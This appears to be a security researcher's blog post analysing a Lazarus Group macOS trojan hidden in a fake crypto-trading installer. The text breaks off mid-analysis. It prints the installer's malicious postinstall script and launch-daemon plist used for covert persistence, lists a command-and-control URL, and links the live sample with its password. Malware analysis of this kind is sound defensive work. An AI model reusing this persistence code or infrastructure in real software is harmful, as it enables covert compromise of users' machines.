<html xmlns="http://www.w3.org/1999/xhtml" xmlns:og="http://ogp.me/ns#">
  <head>
    <meta charset="UTF-8">
    
    <title>Objective-See's Blog</title>
    
    <link rel="shortcut icon" href="../images/logoApple.ico">
    
    <link href="../css/style.css" rel="stylesheet" />
    <script src="../js/analytics.js"></script>
    <script src="../js/sweetalert.min.js"></script>
    <script src="../js/donationPopup.js"></script>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    
    <script type="text/javascript" src="//s3.amazonaws.com/downloads.mailchimp.com/js/signup-forms/popup/embed.js" data-dojo-config="usePlainJson: true, isDebug: false"></script>
    <script type="text/javascript">require(["mojo/signup-forms/Loader"], function(L) { L.start({"baseUrl":"mc.us13.list-manage.com","uuid":"ecee7516f567e712084cdb1d0","lid":"5fae6de946"}) })</script>
    
    
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:site" content="@objective_see" />
<meta name="twitter:image" content=https://objective-see.com/images/blog/blog_0x51/twitter.png />
<meta name="twitter:title" content=Lazarus&#32;Group&#32;Goes&#32;&#39;Fileless&#39; />
<meta name="twitter:description" content=an&#32;implant&#32;w/&#32;remote&#32;download&#32;&amp;&#32;in-memory&#32;execution />
    
<meta property="og:type" content="article" />
<meta property="og:title" content=Lazarus&#32;Group&#32;Goes&#32;&#39;Fileless&#39; />
<meta property="og:image" content=https://objective-see.com/images/blog/blog_0x51/twitter.png />

    </head>
    <body>

    <link rel="stylesheet" type="text/css" href="/css/menu.css">

<meta http-equiv="cache-control" content="max-age=0" />
<meta http-equiv="cache-control" content="no-cache" />
<meta http-equiv="expires" content="0" />
<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
<meta http-equiv="pragma" content="no-cache" />

<nav role="main" style="padding-bottom:30px;">
<ul>
    
    <li>
    <div class="logo">
        <a href="/index.html">
            <figure class="logo">
                <img src="/images/logoApple.png" style="height:75px; width:75px;" />
                <br>
                <figcaption class="logo">
                    <span style="color: #95c02d;">Objective</span><span style="color: #798992;">-See</span>
                 
                    <div style="color: #798992; font-size: 18px; font-weight: 300; padding-left: 3px; margin-top: -2px;">
                     a non-profit 501(c)(3) foundation.
                    </div>
                
                </figcaption>
            </figure>
        </a>
    </div>
    </li>

    
    <li>  
        <div class="menuicon">
        <div style="position: relative; min-width:0px;">
        <input type="checkbox" class="toggler">
        <div class="hamburger"><div></div></div>
        <div class="menu">
        <div style="padding-right: 20px;">
            <ul>

                <li>
                    <a href="/news.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/newsIcon.png" height="24px;">
                        <span style="vertical-align:middle">News</span>
                    </a>
                </li>

                <li>
                    <a href="https://objective-see.myshopify.com/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/storeIcon.png" height="24px;">
                        <span style="vertical-align:middle">Swag</span>
                    </a>
                </li>

                <li>
                    <a href="https://taomm.org/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/bookIcon.png" height="24px;">
                        <span style="vertical-align:middle">Books</span>
                    </a>
                </li>

                <li>
                    <a href="https://objectivebythesea.com/" target="_blank" style="display:block;">
                        <img style="vertical-align:middle" src="/images/conferenceIcon.png" height="24px;">
                        <span style="vertical-align:middle">Conference</span>
                    </a>
                </li>

                 <li>
                    <a href="/malware.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/malwareIcon.png" height="24px;">
                        <span style="vertical-align:middle">Malware Collection</span>
                    </a>
                </li>

                <li style="border-bottom: none;">
                    <a href="/about.html" style="display:block;">
                        <img style="vertical-align:middle" src="/images/aboutIcon.png" height="24px;">
                        <span style="vertical-align:middle">About Objective-See</span>
                    </a>
                </li>

            </ul>
        </div>
    </div>
    </div>
    </div>

    </li>

    
    <li>
        <form action="/support.html" style="display: inline;">
            <button class="menuicon button-4" role="button">Support Us!</button>
        </form>
    </li>

    
    <li>
        <a href="/blog.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/blogIcon.png" class="item"/>
                <figcaption class="item">blog</figcaption>
            </center>
        </figure>
        </a>
    </li>
    
    
    <li>
        <a href="/products.html" class="menuicon">
        <figure class="item">
            <center>
                <img src="/images/productsIcon.png" class="item"/>
            </center>
            <figcaption class="item">tools</figcaption>
        </figure>
        </a>
    </li>

</ul>

<hr class="gradient">

</nav>
    
    <div class="pageContent">
      <br>
      
<section class="blogContent" style="padding-bottom:50px";>
  <div class="blogTitle">Lazarus Group Goes &#39;Fileless&#39;</div>
  <div class="blogSubTitle">an implant w/ remote download &amp; in-memory execution</div>
  <div class="blogDate" style="padding-top:10px;">by: Patrick Wardle / December 3, 2019</div>
  <div style="border: 1px solid #95c02d; padding: 10px; margin-top:15px; font-size: 15px;">
    <span class="n3rdFont">
    Our research, tools, and writing, are supported by "Friends of Objective-See" such as:
    <br>
    <center>
      <a href="https://macpaw.com/cleanmymac" style="text-decoration: none;">
      <img src="../images/friends/cleanmymac.png" width="100px;" style="display:block;  margin:auto; padding-top: 10px;"/>
      CleanMy Mac X
      </a>
    </center>
    <table border="0" style="width:100%; border: none">
    <tr style="width:100%;">
    <td style="padding: 0px; border: none" border="0" align="center">
      <a href="https://malwarebytes.com/" style="text-decoration: none;">
      <img src="../images/friends/malwarebytes.png" width="100px;" style="display:block;  margin:auto; padding-top: 0px;"/>
      Malwarebytes
      </a>
    </td>
    <td style="padding: 0px; border: none" border="0" align="center">
      <a href="https://www.airoav.com/" style="text-decoration: none;">
      <img src="../images/friends/airo.png" width="100px;" style="display:block;  margin:auto; padding-top: 0px;"/>
      Airo AV
      </a>
    </td>
    </tr>
    </table>
    <br>
    <div align="right" style="padding-right:10px; padding-bottom:10px;">
        <a href="https://objective-see.com/friends.html" class="inlineLink">Become a Friend!</a>
    </div>
  </span>
</div>
\
\
<div class="note">
&#x1F4DD; &#x1F47E; Want to play along?
<p>I’ve added the <a href="https://objective-see.com/downloads/malware/AppleJeus.zip">sample</a> (&lsquo;OSX.AppleJeus.C&rsquo;) to our malware collection (password: infect3d)</p>
<p>&hellip;please don’t infect yourself!</p>
</div>
<h3 id="background">Background</h3>
<p>Today, <a href="https://twitter.com/dineshdina04/">Dinesh_Devadoss</a> posted a tweet about another Lazarus group macOS trojan:</p>
<center>
<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Another <a href="https://twitter.com/hashtag/Lazarus?src=hash&amp;ref_src=twsrc%5Etfw">#Lazarus</a> <a href="https://twitter.com/hashtag/macOS?src=hash&amp;ref_src=twsrc%5Etfw">#macOS</a> <a href="https://twitter.com/hashtag/trojan?src=hash&amp;ref_src=twsrc%5Etfw">#trojan</a> <br>md5: 6588d262529dc372c400bef8478c2eec<br>hxxps://unioncrypto.vip/<br><br>Contains code: Loads Mach-O from memory and execute it /  Writes to a file and execute it<a href="https://twitter.com/patrickwardle?ref_src=twsrc%5Etfw">@patrickwardle</a> <a href="https://twitter.com/thomasareed?ref_src=twsrc%5Etfw">@thomasareed</a> <a href="https://t.co/Mpru8FHELi">pic.twitter.com/Mpru8FHELi</a></p>&mdash; Dinesh_Devadoss (@dineshdina04) <a href="https://twitter.com/dineshdina04/status/1201834142704394242?ref_src=twsrc%5Etfw">December 3, 2019</a></blockquote>
<script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

</center>
<p>As I&rsquo;d recently written about a Lazarus group first stage implant (see: <a href="https://objective-see.com/blog/blog_0x49.html">&ldquo;Pass the AppleJeus&rdquo;</a>), I was intrigued to analyze this sample!</p>
<p>We&rsquo;ll see while there are some clear overlaps, this (new) sample contains a rather sophisticated capabilities, which I&rsquo;ve never seen before in (public) macOS malware!</p>
<div class="note">
The Lazarus Group has recently been quite active in the macOS space. To read more about their past activity, see:
<ul>
<li>
<p><a href="https://securelist.com/operation-applejeus/87553/">&ldquo;Operation AppleJeus: Lazarus hits cryptocurrency exchange w/ fake installer &amp; macOS malware&rdquo;</a>
\</p>
</li>
<li>
<p><a href="https://blog.trendmicro.com/trendlabs-security-intelligence/mac-malware-that-spoofs-trading-app-steals-user-information-uploads-it-to-website/">&ldquo;Mac Malware that Spoofs Trading App Steals User Information, Uploads it to Website&rdquo;</a>
\</p>
</li>
<li>
<p><a href="https://www.sentinelone.com/blog/detecting-macos-gmera-malware-through-behavioral-inspection/">&ldquo;Detecting macOS.GMERA Malware Through Behavioral Inspection&rdquo;</a>
\</p>
</li>
<li>
<p><a href="https://objective-see.com/blog/blog_0x49.html">&ldquo;Pass the AppleJeus&rdquo;</a></p>
</li>
</ul>
</div>
<h3 id="infection-vector">Infection Vector</h3>
<p>In his <a href="https://twitter.com/dineshdina04/status/1201834142704394242">tweet</a>, Dinesh kindly provided an MD5 hash: <code>6588d262529dc372c400bef8478c2eec</code> which allows us to locate the sample (<code>UnionCryptoTrader.dmg</code>) on VirusTotal, where it&rsquo;s only flagged as malicious by two of the engines. (See: <a href="https://www.virustotal.com/gui/file/2ab58b7ce583402bf4cbc90bee643ba5f9503461f91574845264d4f7e3ccb390/detection">UnionCryptoTrader.dmg</a> on VirusTotal).</p>
<img src="../images/blog/blog_0x51/vt.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>From the URL provided in Dinesh&rsquo;s <a href="https://twitter.com/dineshdina04/status/1201834142704394242">tweet</a>, (<code>https://unioncrypto.vip/</code>) and spelunking around on VirusTotal, we can gain an understanding of the infection mechanism.</p>
<p>Lazarus Group has a propensity for targeting users or administrators of crypto-currency exchanges. And their de facto method of infecting such targets is via fake crypto-currency company and trading applications.</p>
<p>As part of my recent RSA <a href="https://www.rsaconference.com/industry-topics/presentation/whats-your-game-plan-leveraging-apples-game-engine-to-detect-threats">presentation</a> I highlighted their attack vector:
\</p>
<img src="../images/blog/blog_0x49/rsa.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>In this specific attack, Lazarus group created a new website, <code>unioncrypto.vip</code>:
\</p>
<img src="../images/blog/blog_0x51/website.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>Pinging this site reveals that it&rsquo;s still online, and resolving to <code>104.168.167.16</code>:
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ ping unioncrypto.vip
PING unioncrypto.vip (104.168.167.16): 56 data bytes
64 bytes from 104.168.167.16: icmp_seq=0 ttl=112 time=91.483 ms
</pre>
</div></p>
<p>Querying VirusTotal with this IP address, we find a <a href="https://www.virustotal.com/gui/url/1b3d9c75fd1f2e738011997d91cd959156af9c11d391a91fe5cb2b4562accce4/detection">URL request</a> that triggered a download of the malicious application (<code>https://www.unioncrypto.vip/download/W6c2dq8By7luMhCmya2v97YeN</code>):
<img src="../images/blog/blog_0x51/download.png"  width="100%" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>
</p>
<p>It seems reasonable to assume that Lazarus Group is sticking with its successful attack vector (of targeting employees of crypto-currency exchanges with trojanized trading applications) &hellip;for now!</p>
<h3 id="analysis-persistence">Analysis (Persistence)</h3>
<p>Let&rsquo;s begin analysis of the trojanzied application. Said application is delivered via a disk image, named <code>UnionCryptoTrader.dmg</code>
We can mount this disk image, via the <code>hdiutil attach</code> command:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ hdiutil attach ~/Downloads/UnionCryptoTrader.dmg 
expected   CRC32 $7720DF1C
/dev/disk4            GUID_partition_scheme           
/dev/disk4s1          Apple_APFS                      
/dev/disk5            EF57347C-0000-11AA-AA11-0030654 
/dev/disk5s1          41504653-0000-11AA-AA11-0030654 /Volumes/UnionCryptoTrader
</pre>
</div>
<p>It contains a single package: <code>UnionCryptoTrader.pkg</code>:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ ls -lart /Volumes/UnionCryptoTrader
total 40120
-rwxrwxrwx  1 patrick  staff  20538265 Sep  4 06:25 UnionCryptoTrader.pkg
</pre>
</div>
<p>Via our <a href="https://objective-see.com/products/whatsyoursign.html">&ldquo;WhatsYourSign&rdquo;</a> application, it&rsquo;s easy to see the <code>UnionCryptoTrader.pkg</code> package is unsigned:</p>
<img src="../images/blog/blog_0x51/pkgUnsigned.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>&hellip;which means macOS will warn the user, if they attempt to open it:</p>
<img src="../images/blog/blog_0x51/warning.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>Taking a peek at the package, uncovers a <code>postinstall</code> script that will be executed at the end of the installation process:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#75715e">#!/bin/sh
</span></span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#75715e"></span>mv /Applications/UnionCryptoTrader.app/Contents/Resources/.vip.unioncrypto.plist 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span>   /Library/LaunchDaemons/vip.unioncrypto.plist
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>chmod <span style="color:#ae81ff">644</span> /Library/LaunchDaemons/vip.unioncrypto.plist
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>mkdir /Library/UnionCrypto
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>mv /Applications/UnionCryptoTrader.app/Contents/Resources/.unioncryptoupdater 
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>   /Library/UnionCrypto/unioncryptoupdater
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>chmod +x /Library/UnionCrypto/unioncryptoupdater
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>/Library/UnionCrypto/unioncryptoupdater &amp;</span></span></code></pre></div>
<p>The purpose of this script is to persistently install a launch daemon.</p>
<p>Specifically, the script will:</p>
<ul>
<li>
<p>move a hidden plist (<code>.vip.unioncrypto.plist</code>) from the application&rsquo;s <code>Resources</code> directory into <code>/Library/LaunchDaemons</code></p>
</li>
<li>
<p>set it to be owned by root</p>
</li>
<li>
<p>create a <code>/Library/UnionCrypto</code> directory</p>
</li>
<li>
<p>move a hidden binary (<code>.unioncryptoupdater</code>) from the application&rsquo;s <code>Resources</code> directory into <code>/Library/UnionCrypto/</code></p>
</li>
<li>
<p>set it to be executable</p>
</li>
<li>
<p>execute this binary (<code>/Library/UnionCrypto/unioncryptoupdater</code>)</p>
</li>
</ul>
<p>We can passively observe this part of the installation via either our <a href="https://objective-see.com/products/utilities.html#FileMonitor">File</a> or <a href="https://objective-see.com/products/utilities.html#ProcessMonitor">Process</a> monitors:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
# ProcessMonitor.app/Contents/MacOS/ProcessMonitor -pretty

{
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
  "process" : {
    "uid" : 0,
    "arguments" : [
      "mv",
      "/Applications/UnionCryptoTrader.app/Contents/Resources/.vip.unioncrypto.plist",
      "/Library/LaunchDaemons/vip.unioncrypto.plist"
    ],
    "ppid" : 3457,
    "ancestors" : [
      3457,
      951,
      1
    ],
    "signing info" : {
      "csFlags" : 603996161,
      "signatureIdentifier" : "com.apple.mv",
      "cdHash" : "7F1F3DE78B1E86A622F0B07F766ACF2387EFDCD",
      "isPlatformBinary" : 1
    },
    "path" : "/bin/mv",
    "pid" : 3458
  },
  "timestamp" : "2019-12-05 20:14:28 +0000"
}

...

{
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
  "process" : {
    "uid" : 0,
    "arguments" : [
      "mv",
      "/Applications/UnionCryptoTrader.app/Contents/Resources/.unioncryptoupdater",
      "/Library/UnionCrypto/unioncryptoupdater"
    ],
    "ppid" : 3457,
    "ancestors" : [
      3457,
      951,
      1
    ],
    "signing info" : {
      "csFlags" : 603996161,
      "signatureIdentifier" : "com.apple.mv",
      "cdHash" : "7F1F3DE78B1E86A622F0B07F766ACF2387EFDCD",
      "isPlatformBinary" : 1
    },
    "path" : "/bin/mv",
    "pid" : 3461
  },
  "timestamp" : "2019-12-05 20:14:28 +0000"
}

...

{
  "event" : "ES_EVENT_TYPE_NOTIFY_EXEC",
  "process" : {
    "uid" : 0,
    "arguments" : [
      "/Library/UnionCrypto/unioncryptoupdater"
    ],
    "ppid" : 1,
    "ancestors" : [
      1
    ],
    "signing info" : {
      "csFlags" : 536870919,
      "signatureIdentifier" : "macloader-55554944ee2cb96a1f5132ce8788c3fe0dfe7392",
      "cdHash" : "8D204E5B7AE08E80B728DE675AEB8CC735CCF6E7",
      "isPlatformBinary" : 0
    },
    "path" : "/Library/UnionCrypto/unioncryptoupdater",
    "pid" : 3463
  },
  "timestamp" : "2019-12-05 20:14:28 +0000"
}

</pre>
</div>
<p>Though installing a launch daemon requires root access, the installer will prompt the user for their credentials:</p>
<img src="../images/blog/blog_0x51/installer.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>

<p>Once the installer completes, the binary <code>unioncryptoupdater</code> will both currently executing, and persistently installed:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ ps aux | grep  [u]nioncryptoupdater
root  1254  /Library/UnionCrypto/unioncryptoupdater
</pre>
</div>
<p>Of course, <a href="https://objective-see.com/products/blockblock.html">BlockBlock</a> will detect the launch daemon persistence attempt:
<br>
<img src="../images/blog/blog_0x51/blockblock.png"  width="" class="center" style="border-radius: 4px;">

<center style="color:#787878; padding-top:5px;"> </center>
</p>
<p>As noted, persistence is achieved via the <code>vip.unioncrypto.plist</code> launch daemon:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-XML" data-lang="XML"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span><span style="color:#75715e">&lt;!DOCTYPE plist PUBLIC &#34;-//Apple//DTD PLIST 1.0//EN&#34; ...&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span><span style="color:#f92672">&lt;plist</span> <span style="color:#a6e22e">version=</span><span style="color:#e6db74">&#34;1.0&#34;</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span><span style="color:#f92672">&lt;dict&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span>    <span style="color:#f92672">&lt;key&gt;</span>Label<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span>    <span style="color:#f92672">&lt;string&gt;</span>vip.unioncrypto.product<span style="color:#f92672">&lt;/string&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>    <span style="color:#f92672">&lt;key&gt;</span>ProgramArguments<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>    <span style="color:#f92672">&lt;array&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>            <span style="color:#f92672">&lt;string&gt;</span>/Library/UnionCrypto/unioncryptoupdater<span style="color:#f92672">&lt;/string&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>    <span style="color:#f92672">&lt;/array&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>    <span style="color:#f92672">&lt;key&gt;</span>RunAtLoad<span style="color:#f92672">&lt;/key&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>    <span style="color:#f92672">&lt;true/&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span><span style="color:#f92672">&lt;/dict&gt;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span><span style="color:#f92672">&lt;/plist&gt;</span></span></span></code></pre></div>
<p>As the <code>RunAtLoad</code> key is set to <code>true</code> this instruct macOS to automatically launch the binary specified in the <code>ProgramArguments</code> array each time the infected system is rebooted. As such <code>/Library/UnionCrypto/unioncryptoupdater</code> will be automatically (re) executed.</p>
<div class="note">
<p>Installing a launch daemon (who&rsquo;s plist and binary were both stored hidden in the application&rsquo;s resource directory) again matches Lazarus groups modus operandi.</p>
<p>See Kaspersky&rsquo;s writeup: <a href="https://securelist.com/operation-applejeus/87553/">&ldquo;Operation AppleJeus: Lazarus hits cryptocurrency exchange with fake installer and macOS malware&rdquo;</a></p>
</div>
<h3 id="analysis-capabilities">Analysis (Capabilities)</h3>
<p>Ok, time to analyze the persisted <code>unioncryptoupdater</code> binary.</p>
<p>Via the <code>file</code> command we can ascertain its a standard macOS (64bit) binary:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ file /Library/UnionCrypto/unioncryptoupdater 
/Library/UnionCrypto/unioncryptoupdater: Mach-O 64-bit executable x86_64
</pre>
</div>
<p>The <code>codesign</code> utility shows us both it identifier (<code>macloader-55554944ee2cb96a1f5132ce8788c3fe0dfe7392</code>) and the fact that it&rsquo;s not signed with a valid code signing id, but rather adhoc (<code>Signature=adhoc</code>):</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ codesign -dvv /Library/UnionCrypto/unioncryptoupdater 
Executable=/Library/UnionCrypto/unioncryptoupdater
Identifier=macloader-55554944ee2cb96a1f5132ce8788c3fe0dfe7392
Format=Mach-O thin (x86_64)
CodeDirectory v=20100 size=739 flags=0x2(adhoc) hashes=15+5 location=embedded
Signature=adhoc
Info.plist=not bound
TeamIdentifier=not set
Sealed Resources=none
Internal requirements count=0 size=12
</pre>
</div>
<p>Running the <code>strings</code> utility (with the <code>-a</code> flag) reveals some interesting strings:</p>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ strings -a /Library/UnionCrypto/unioncryptoupdater 

curl_easy_perform() failed: %s
AES_CYPHER_128 encrypt test case:
AES_CYPHER_128 decrypt test case:
AES_CYPHER_192 encrypt test case:
AES_CYPHER_192 decrypt test case:
AES_CYPHER_256 encrypt test case:
AES_CYPHER_256 decrypt test case:
Input:
IOPlatformExpertDevice
IOPlatformSerialNumber
/System/Library/CoreServices/SystemVersion.plist
ProductVersion
ProductBuildVersion
Mac OS X %s (%s)
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/
/tmp/updater
%s %s
NO_ID
%s%s
12GWAPCT1F0I1S14
auth_timestamp
auth_signature
check
https://unioncrypto.vip/update
done
/bin/rcp
Could not create image.
Could not link image.
Could not find ec.
Could not resolve symbol: _sym[25] == 0x4d6d6f72.
Could not resolve symbol: _sym[4] == 0x4d6b6e69.
</pre>
</div>
<p>Strings such as <code>IOPlatformSerialNumber</code> and reference to the <code>SystemVersion.plist</code> likely indicate basic survey capabilities (to gather information about the infected system). The reference to <code>libcurl</code> API (<code>curl_easy_perform</code>) and embedded url <code>https://unioncrypto.vip/update</code> indicate networking and/or command and control capabilities.</p>
<p>Opening a the binary (<code>unioncryptoupdater</code>) in a disassembler, shows the <code>main</code> function simply invoking a function named <code>onRun</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-C" data-lang="C"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">_main</span>() {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>    rbx <span style="color:#f92672">=</span> objc_autoreleasePoolPush();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>    onRun();
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span>    
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span>    objc_autoreleasePoolPop(rbx);
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0x0</span>;
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8</span><span>}</span></span></code></pre></div>
<p>Though rather long and involved we can break down its logic.</p>
<ol>
<li>
<p>Instantiate a C++ class named Barbeque: <code>Barbeque::Barbeque();</code>
By piping the output of the <code>nm</code> utility into <code>c++filt</code> we can dump other methods from the <code>Barbeque</code> class:
<br>
<br>
<div style="border: 1px solid gray; border-radius: 4px; padding-left:25px; padding-right:25px; overflow-wrap: break-word; background-color:#2A2E35; color:lime;">
    <pre style="font-size: 18px;">
$ nm unioncryptoupdater | c++filt

unsigned short Barbeque::Barbeque()
unsigned short Barbeque::get( ... )
unsigned short Barbeque::post( ... )
unsigned short Barbeque::~Barbeque()
</pre>
</div>
<br>
Based on method names, perhaps the <code>Barbeque</code> class contains network related logic?
<br>
\</p>
</li>
<li>
<p>Invokes a function named <code>getDeviceSerial</code> to retrieve the system serial number via <code>IOKit</code> (<code>IOPlatformSerialNumber</code>):
<br>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-objc" data-lang="objc"><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">__Z15getDeviceSerialPc</span>(<span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span> arg0) {
</span></span><span style="display:flex;"><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>    
